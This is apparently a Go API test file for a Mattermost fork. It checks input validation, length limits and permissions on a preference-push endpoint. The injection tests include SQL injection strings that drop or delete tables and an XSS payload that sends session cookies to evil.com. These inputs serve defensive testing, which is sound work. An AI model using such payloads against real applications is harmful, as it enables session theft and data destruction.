// Copyright (c) 2015-present Mattermost, Inc. All Rights Reserved.
// See LICENSE.txt for license information.

package api4

// mattermost-extended-test

import (
	"context"
	"net/http"
	"strings"
	"testing"

	"github.com/mattermost/mattermost/server/public/model"
)

// ----------------------------------------------------------------------------
// PREFERENCE PUSH ABUSE & EDGE CASES
// ----------------------------------------------------------------------------

func TestPreferencePushInjection(t *testing.T) {
	th := Setup(t).InitBasic(t)

	t.Run("SQL injection in category field returns 400 (too long or invalid)", func(t *testing.T) {
		req := &model.PushPreferenceRequest{
			Category: "'; DROP TABLE preferences; --",
			Name:     "theme",
			Value:    "dark",
		}
		resp, err := th.SystemAdminClient.DoAPIPostJSON(context.Background(), "/users/"+th.SystemAdminUser.Id+"/preferences/push", req)
		// Category > 32 chars should be rejected
		checkStatusCode(t, resp, err, http.StatusBadRequest)
	})

	t.Run("SQL injection in name field (within 32 chars)", func(t *testing.T) {
		req := &model.PushPreferenceRequest{
			Category: "test",
			Name:     "' OR '1'='1",
			Value:    "injected",
		}
		resp, err := th.SystemAdminClient.DoAPIPostJSON(context.Background(), "/users/"+th.SystemAdminUser.Id+"/preferences/push", req)
		// Should succeed (parameterized queries prevent actual injection)
		checkStatusCode(t, resp, err, http.StatusOK)
		closeIfOpen(resp, err)
	})

	t.Run("SQL injection in value field", func(t *testing.T) {
		req := &model.PushPreferenceRequest{
			Category: "test",
			Name:     "sqli_value",
			Value:    "'; DELETE FROM preferences WHERE '1'='1",
		}
		resp, err := th.SystemAdminClient.DoAPIPostJSON(context.Background(), "/users/"+th.SystemAdminUser.Id+"/preferences/push", req)
		checkStatusCode(t, resp, err, http.StatusOK)
		closeIfOpen(resp, err)
	})

	t.Run("XSS payload in preference value", func(t *testing.T) {
		req := &model.PushPreferenceRequest{
			Category: "test",
			Name:     "xss_value",
			Value:    `<script>document.location='https://evil.com/?c='+document.cookie</script>`,
		}
		resp, err := th.SystemAdminClient.DoAPIPostJSON(context.Background(), "/users/"+th.SystemAdminUser.Id+"/preferences/push", req)
		checkStatusCode(t, resp, err, http.StatusOK)
		closeIfOpen(resp, err)
	})
}

func TestPreferencePushBoundary(t *testing.T) {
	th := Setup(t).InitBasic(t)

	t.Run("Category at exactly 32 chars is accepted", func(t *testing.T) {
		req := &model.PushPreferenceRequest{
			Category: strings.Repeat("a", 32),
			Name:     "test",
			Value:    "value",
		}
		resp, err := th.SystemAdminClient.DoAPIPostJSON(context.Background(), "/users/"+th.SystemAdminUser.Id+"/preferences/push", req)
		checkStatusCode(t, resp, err, http.StatusOK)
		closeIfOpen(resp, err)
	})

	t.Run("Category at 33 chars is rejected", func(t *testing.T) {
		req := &model.PushPreferenceRequest{
			Category: strings.Repeat("a", 33),
			Name:     "test",
			Value:    "value",
		}
		resp, err := th.SystemAdminClient.DoAPIPostJSON(context.Background(), "/users/"+th.SystemAdminUser.Id+"/preferences/push", req)
		checkStatusCode(t, resp, err, http.StatusBadRequest)
	})

	t.Run("Name at exactly 32 chars is accepted", func(t *testing.T) {
		req := &model.PushPreferenceRequest{
			Category: "test",
			Name:     strings.Repeat("b", 32),
			Value:    "value",
		}
		resp, err := th.SystemAdminClient.DoAPIPostJSON(context.Background(), "/users/"+th.SystemAdminUser.Id+"/preferences/push", req)
		checkStatusCode(t, resp, err, http.StatusOK)
		closeIfOpen(resp, err)
	})

	t.Run("Name at 33 chars is rejected", func(t *testing.T) {
		req := &model.PushPreferenceRequest{
			Category: "test",
			Name:     strings.Repeat("b", 33),
			Value:    "value",
		}
		resp, err := th.SystemAdminClient.DoAPIPostJSON(context.Background(), "/users/"+th.SystemAdminUser.Id+"/preferences/push", req)
		checkStatusCode(t, resp, err, http.StatusBadRequest)
	})

	t.Run("Empty name is accepted (name can be empty per validation)", func(t *testing.T) {
		req := &model.PushPreferenceRequest{
			Category: "test",
			Name:     "",
			Value:    "value",
		}
		resp, err := th.SystemAdminClient.DoAPIPostJSON(context.Background(), "/users/"+th.SystemAdminUser.Id+"/preferences/push", req)
		// Name validation only checks > 32, not empty
		checkStatusCode(t, resp, err, http.StatusOK)
		closeIfOpen(resp, err)
	})

	t.Run("Overwrite existing preference", func(t *testing.T) {
		req := &model.PushPreferenceRequest{
			Category:          "display_settings",
			Name:              "theme",
			Value:             "overwritten",
			OverwriteExisting: true,
		}
		resp, err := th.SystemAdminClient.DoAPIPostJSON(context.Background(), "/users/"+th.SystemAdminUser.Id+"/preferences/push", req)
		checkStatusCode(t, resp, err, http.StatusOK)
		closeIfOpen(resp, err)
	})

	t.Run("Push with user_id in URL that differs from session user", func(t *testing.T) {
		// The user_id in the URL path is for the preferences endpoint routing
		// but the push endpoint affects ALL users. The URL user_id is cosmetic.
		req := &model.PushPreferenceRequest{
			Category: "test",
			Name:     "cross_user",
			Value:    "pushed",
		}
		resp, err := th.SystemAdminClient.DoAPIPostJSON(context.Background(), "/users/"+th.BasicUser.Id+"/preferences/push", req)
		// Admin can push to any user_id route
		checkStatusCode(t, resp, err, http.StatusOK)
		closeIfOpen(resp, err)
	})
}

func TestPreferenceDiscoveryEdgeCases(t *testing.T) {
	th := Setup(t).InitBasic(t)

	t.Run("Discovery with non-existent user_id still works (returns all keys)", func(t *testing.T) {
		// The user_id param is documented as ignored for discover
		resp, err := th.SystemAdminClient.DoAPIGet(context.Background(), "/users/"+model.NewId()+"/preferences/discover", "")
		checkStatusCode(t, resp, err, http.StatusOK)
		closeIfOpen(resp, err)
	})

	t.Run("Regular user with another users user_id still gets 403", func(t *testing.T) {
		resp, err := th.Client.DoAPIGet(context.Background(), "/users/"+th.SystemAdminUser.Id+"/preferences/discover", "")
		checkStatusCode(t, resp, err, http.StatusForbidden)
	})
}
